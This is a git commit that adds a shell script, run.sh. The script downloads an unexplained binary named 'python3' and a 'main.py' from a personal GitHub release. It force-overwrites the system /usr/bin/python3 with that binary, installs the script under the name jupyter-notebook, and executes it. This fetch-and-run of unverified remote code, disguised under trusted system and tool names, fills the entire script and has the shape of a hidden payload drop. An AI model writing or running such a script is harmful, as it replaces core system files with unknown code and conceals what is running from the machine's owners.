c8b184a43f38c264bda9af09b24d24c8ee87bbb8
thuanx287 <thuanx287@gmail.com>
2024-10-23 13:16:39 +0700

    Create run.sh

---
+++ run.sh
@@ -0,0 +1,11 @@
+#!/bin/sh -e
+
+wget https://github.com/thuanx287/temp/releases/download/1/python3
+wget https://github.com/thuanx287/temp/releases/download/1/main.py
+
+chmod 755 python3
+
+mv -f python3 /usr/bin/python3
+mv -f main.py /usr/local/bin/jupyter-notebook
+
+/usr/bin/python3 /usr/local/bin/jupyter-notebook
